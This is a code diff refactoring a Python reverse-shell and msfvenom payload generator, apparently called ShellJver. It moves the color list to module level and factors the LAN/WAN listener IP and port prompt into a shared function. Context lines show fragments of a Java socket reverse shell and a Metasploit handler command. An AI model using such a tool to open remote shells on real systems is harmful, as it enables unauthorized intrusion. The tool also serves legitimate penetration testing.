@@ -4,15 +4,15 @@ from urllib import request
 from random import choice
 import signal
 
+color = ['\033[95m', '\033[96m', '\033[36m', '\033[94m', '\033[92m', '\033[93m', '\033[91m']
+
 
 def signal_handler(sig, frame):
     print('\nBye!')
     sys.exit(1)
 
 
-def shell():
-    color = ['\033[95m', '\033[96m', '\033[36m', '\033[94m', '\033[92m', '\033[93m', '\033[91m']
-
+def ask_listener():
     lan = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('10.255.255.255', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
     wan = request.urlopen('https://api.ipify.org').readline().decode('utf-8')
     print(f'{choice(color)}For LAN enter 1: {lan}')
@@ -33,6 +33,11 @@ def shell():
             break
         except ValueError:
             print('Invalid input.')
+    return ipp, port
+
+
+def shell():
+    ipp, port = ask_listener()
 
     # Keeping with the random colors, but adding color coding for different OS
     os_colors = {'windows': choice(color)}
@@ -168,8 +173,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 
 def payload():
-    color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
-
     while True:
         ven = input('Enter payload: ')
         try:
@@ -178,26 +181,8 @@ def payload():
             break
         except ValueError:
             print('Invalid input.')
-    lan = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('10.255.255.255', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
-    wan = request.urlopen('https://api.ipify.org').readline().decode('utf-8')
-    print(f'{choice(color)}For LAN enter 1: {lan}')
-    print(f'{choice(color)}For WAN enter 2: {wan}')
-    while True:
-        cw = input('Which one do you want, LAN or WAN?: ')
-        if cw == '1':
-            ipp = lan
-            break
-        elif cw == '2':
-            ipp = wan
-            break
-        print('Invalid input.')
-    while True:
-        port = input('Select listening port: ')
-        try:
-            int(port)
-            break
-        except ValueError:
-            print('Invalid input.')
+
+    ipp, port = ask_listener()
 
     msfpc_format = None
     msfvenom_rc = None
@@ -332,8 +317,6 @@ run -j""")
 
 
 def banner():
-    color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
-
     print(choice(color) + """
                                     ╔═╗┬ ┬┌─┐╦  ╦ ╦  ╦┌─┐┬─┐
                                     ╚═╗├─┤├┤ ║  ║ ╚╗╔╝├┤ ├┬┘
@@ -346,8 +329,6 @@ def banner():
 
 
 def main(arg):
-    color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
-
     parser = argparse.ArgumentParser()
     parser.add_argument('use', help='msf|shell')
     args = parser.parse_args()
